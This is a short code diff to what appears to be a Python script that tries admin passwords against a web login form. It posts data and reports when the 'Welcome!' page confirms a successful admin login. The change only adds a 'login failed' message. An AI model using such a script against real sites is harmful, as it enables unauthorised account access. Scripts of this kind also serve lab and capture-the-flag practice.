@@ -48,6 +48,8 @@ try:
     response=requests.post(url,data_to_send,timeout=0.75)
     if "Welcome!" in response.text :
         print(f"[!!!] Successfully login as admin with password: {pass_admin}")
+    else:
+        print("[-] login failed")
 except requests.Timeout:
     print("[*] Time out, please try again later")
 
